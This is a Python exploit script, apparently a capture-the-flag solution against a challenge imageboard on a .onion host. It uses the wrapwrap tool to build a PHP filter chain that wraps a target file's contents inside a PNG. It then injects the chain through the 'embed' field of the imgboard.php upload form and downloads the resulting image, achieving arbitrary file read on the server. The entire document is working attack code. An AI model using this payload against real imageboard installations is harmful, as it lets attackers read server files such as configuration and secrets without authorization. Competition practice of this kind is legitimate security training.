from wrapwrap import wrapwrap
import requests
import re
import sys

# dummy image
with open('x.png', 'rb') as f:
    imgdata = f.read()

iend_index = imgdata.find(b'IEND')

file = sys.argv[1]
nbytes = int(sys.argv[2])

wrapwrap.WrapWrap(file, imgdata[:iend_index], imgdata[iend_index:], nbytes).run()


with open('chain.txt') as f:
    payload = f.read()

base_url = 'http://ecsc24plustgwycod3eepmvtsg3tuddeg55l7fhdh75fzskmvhj6cnad.onion/ib'

body = f'''
-----------------------------12327708879754764271466226480
Content-Disposition: form-data; name="MAX_FILE_SIZE"

2097152
-----------------------------12327708879754764271466226480
Content-Disposition: form-data; name="parent"

0
-----------------------------12327708879754764271466226480
Content-Disposition: form-data; name="name"

a
-----------------------------12327708879754764271466226480
Content-Disposition: form-data; name="email"

a
-----------------------------12327708879754764271466226480
Content-Disposition: form-data; name="subject"

a
-----------------------------12327708879754764271466226480
Content-Disposition: form-data; name="message"

a
-----------------------------12327708879754764271466226480
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream


-----------------------------12327708879754764271466226480
Content-Disposition: form-data; name="embed"

{payload}
-----------------------------12327708879754764271466226480
Content-Disposition: form-data; name="password"


-----------------------------12327708879754764271466226480--'''

r = requests.post(f'{base_url}/imgboard.php', headers={
    'Content-Type': 'multipart/form-data; boundary=---------------------------12327708879754764271466226480'
}, data=body).text

try:
    filename = re.findall(r'&quot;src/(.+)\.png&quot; is not', r)[0]
    img = requests.get(f'{base_url}/src/{filename}.png').content
    with open('out.png', 'wb') as f:
        f.write(img)

    print('saved as out.png')
except Exception as e:
    print(r)
    print('error', e)
    if 'failed to download file at specified url' in r.lower():
        print('file not found')
